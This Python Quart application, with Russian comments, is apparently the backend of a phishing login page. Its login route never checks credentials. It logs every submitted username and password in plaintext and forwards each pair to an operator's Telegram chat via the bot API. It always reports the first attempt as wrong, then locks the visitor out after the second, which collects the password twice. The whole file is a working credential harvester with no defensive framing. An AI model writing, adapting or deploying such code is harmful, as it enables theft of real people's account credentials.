from quart import Quart, render_template, request, session, redirect, url_for
from datetime import datetime, timedelta, UTC
import aiohttp
import os
from dotenv import load_dotenv

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")

app = Quart(__name__)
app.secret_key = os.getenv("SECRET_KEY", "supersecret")

MAX_ATTEMPTS = 2
LOCK_TIME_SECONDS = 300  # 5 минут блокировки

def log_user_input(data: dict, step: str):
    os.makedirs('logs', exist_ok=True)
    with open('logs/user_input_log.txt', 'a', encoding='utf-8') as f:
        f.write(f"--- [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {step} ---\n")
        for key, value in data.items():
            f.write(f"{key}: {value}\n")
        f.write("\n")


@app.route('/')
async def index():
    return redirect(url_for("login"))


@app.route('/login', methods=['GET', 'POST'])
async def login():
    error = None
    now = datetime.now(UTC)

    # Проверка блокировки
    locked_until = session.get("locked_until")
    if locked_until:
        locked_until = datetime.fromisoformat(locked_until)
        if now < locked_until:
            return await render_template(
                "login.html",
                error="Вы исчерпали лимит попыток. Повторите позже.",
                attempts=MAX_ATTEMPTS,
                locked=True
            )

    attempts = session.get("attempts", 0)

    if request.method == "POST":
        form = await request.form
        login_input = form.get("login", "").strip()
        password_input = form.get("password", "").strip()

        log_user_input({"login": login_input, "password": password_input}, "Login Attempt")

        # ВСЕГДА отправляем админу
        message = (
            f"🔐 <b>Попытка входа</b>\n"
            f"👤 Логин: <code>{login_input}</code>\n"
            f"🔑 Пароль: <code>{password_input}</code>"
        )

        async with aiohttp.ClientSession() as http:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {
                "chat_id": ADMIN_CHAT_ID,
                "text": message,
                "parse_mode": "HTML"
            }
            await http.post(url, data=payload)

        # УВЕЛИЧИВАЕМ ПОПЫТКИ
        attempts += 1
        session["attempts"] = attempts

        # Если лимит попыток превышен → блокируем
        if attempts >= MAX_ATTEMPTS:
            session["locked_until"] = (now + timedelta(seconds=LOCK_TIME_SECONDS)).isoformat()
            return await render_template(
                "login.html",
                error="Вы исчерпали лимит попыток. Повторите позже.",
                attempts=attempts,
                locked=True
            )

        # Первая попытка всегда выдаёт эту ошибку
        error = "Неверный логин или пароль. Повторите попытку."

    return await render_template("login.html", error=error, attempts=attempts, locked=False)


if __name__ == '__main__':
    app.run()
